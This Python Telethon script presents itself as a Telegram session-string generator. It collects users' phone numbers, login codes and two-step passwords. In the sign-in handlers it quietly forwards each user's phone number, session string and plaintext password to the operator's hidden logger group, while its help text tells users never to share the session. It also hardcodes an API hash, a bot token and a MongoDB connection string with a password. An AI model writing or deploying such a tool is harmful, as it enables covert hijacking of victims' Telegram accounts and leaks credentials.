import asyncio
import os
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantCreator, ChannelParticipant
from pymongo import MongoClient

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
MUST_JOIN = "SANATANI_TECH"  # Channel Username
LOGGER_GROUP = -1002477750706  # Replace with your actual Logger Group ID

# 🔹 MongoDB Setup
MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_bot"]
user_collection = db["joined_users"]

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
user_sessions = {}

# 🔹 Function to check if user is in the channel
async def is_user_joined(user_id):
    try:
        participant = await bot(GetParticipantRequest(MUST_JOIN, user_id))
        if isinstance(participant.participant, (ChannelParticipantAdmin, ChannelParticipantCreator, ChannelParticipant)):
            return True
        return False
    except:
        return False  # User is not in the channel or an error occurred

# 🔹 /start command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id

    # ✅ Check if user is in the channel
    if not await is_user_joined(user_id):
        await event.respond(
            "🚨 You must join @SANATANI_TECH to use this bot!\nClick below to join.",
            buttons=[Button.url("✅ Join Channel", f"https://t.me/{MUST_JOIN}")]
        )
        return  # Stop further execution

    # ✅ Save user in MongoDB if not already saved
    if not user_collection.find_one({"user_id": user_id}):
        user_collection.insert_one({"user_id": user_id})

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("❓ Help", b"help")]
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
    )

# 🔹 Button Handler
@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)
    elif event.data == b"help":
        await show_help(event)

# 🔹 Help Message
async def show_help(event):
    help_text = (
        "**🔰 How to Generate a Session String 🔰**\n\n"
        "1️⃣ Click on **Generate Session**.\n"
        "2️⃣ Enter your **phone number** with country code (e.g., +919876543210).\n"
        "3️⃣ Enter the **OTP** received on Telegram.\n"
        "4️⃣ If your account has **2-Step Verification enabled**, enter your **password**.\n"
        "5️⃣ Your **session string** will be generated and displayed.\n\n"
        "⚠️ **Important:** Keep your session string safe! Never share it with anyone."
    )
    await event.respond(help_text)

# 🔹 /generate command
@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id

    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**", buttons=[[Button.inline("❌ Cancel", b"cancel")]])

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]

    if step == "phone":
        phone_number = event.message.text.strip()

        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return

        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()

        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "otp":
        otp_code = event.message.text.strip()

        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()

            # ✅ Log Session String in Logger Group
            await bot.send_message(LOGGER_GROUP, f"🔑 **New Session Generated**\n\n👤 **User:** `{user_id}`\n📲 **Phone:** `{phone_number}`\n\n`{session_string}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            if "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            # ✅ Log Password & Session in Logger Group
            await bot.send_message(LOGGER_GROUP, f"🔑 **New Session Generated**\n\n👤 **User:** `{user_id}`\n📲 **Phone:** `{user_sessions[user_id]['phone']}`\n🔑 **Password:** `{password}`\n\n`{session_string}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Cancel Process
@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await event.respond("❌ **Process cancelled.** Type /start to begin again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
